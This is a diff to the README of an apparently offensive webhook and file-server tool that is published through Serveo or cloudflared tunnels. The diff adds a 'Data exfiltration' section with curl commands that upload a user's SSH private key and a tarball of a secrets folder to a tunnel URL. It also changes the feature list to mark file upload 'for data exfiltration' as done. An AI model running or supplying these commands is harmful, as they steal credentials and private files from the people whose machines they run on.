@@ -109,7 +109,15 @@ sudo python3 webhook.py -p 8080 -d /var/www/html
 - This will:
     - Serve files at http://localhost:8080
     - Attempt to expose it via Serveo
-    - If Serveo is down, it will fallback to cloudflared tunnel
+
+## 🔁 Data exfiltration
+```bash
+curl -F "file=@/home/user/.ssh/id_rsa" https://abc123.cloudflareTunnel.com/upload
+
+tar czf secrets.tar.gz ~/Documents/secrets
+curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
+
+```
 
 ## 🔐 Security Notes
 - This tool uses SSH for Serveo and a reverse proxy for Cloudflared.
@@ -129,8 +137,8 @@ sudo python3 webhook.py -p 8080 -d /var/www/html
 ### 🌐 Server Features
 - [x] Display public tunnel URL clearly
 - [x] Serve files from a specified directory
-- [ ] Web-based directory listing with download buttons
-- [ ] File upload support for RCE/LFI testing
+- [x] Web-based directory listing with download buttons
+- [x] File upload support for data exfiltration
 - [x] Log incoming HTTP requests (IP, User-Agent, Time)
 
 ### ⏱️ Control & Automation
